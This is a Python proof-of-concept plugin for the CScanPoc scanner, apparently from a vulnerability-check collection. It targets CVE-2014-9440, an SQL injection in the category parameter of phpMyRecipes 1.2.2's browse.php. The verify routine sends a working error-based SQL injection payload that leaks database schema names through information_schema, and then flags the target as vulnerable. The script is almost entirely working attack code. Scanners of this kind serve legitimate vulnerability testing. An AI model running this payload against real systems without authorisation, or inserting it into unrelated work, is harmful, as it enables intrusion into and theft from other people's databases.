# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'PhpMyRecipes_0101'  # 平台漏洞编号
    name = 'PhpMyRecipes category参数SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-01-07'  # 漏洞公布时间
    desc = '''
    phpMyRecipes是国外一个简约受欢迎的基于MySQL的内容管理系统。
    phpMyRecipes category参数存在SQL注入漏洞，由于phpMyRecipes browse.php脚本未能正确过滤cagegory参数，允许远程攻击者利用漏洞提交特制的SQL查询，操作或获取数据库数据。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2015-00143'  # 漏洞来源
    cnvd_id = 'CNVD-2015-00143'  # cnvd漏洞编号
    cve_id = 'CVE-2014-9440'  # cve编号
    product = 'PhpMyRecipes'  # 漏洞组件名称
    product_version = '1.2.2'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'b1587f33-8bd0-48f9-89e8-7c3bfda0f5f8'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/pr/browse.php?category=1"
            payload1 = '/pr/browse.php?category=1 and(select 1 FROM(select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,cast(schema_name as char),0x27,0x7e) FROM information_schema.schemata LIMIT 0,1)) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)'

            url = self.target + payload
            url1 = self.target + payload1
            _response = requests.get(url)
            _response1 = requests.get(url1)
            if _response.text != _response1.text and (url == _response.url or url1 == _response1.url) and (_response.status_code == 200 or _response1.status_code == 200):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
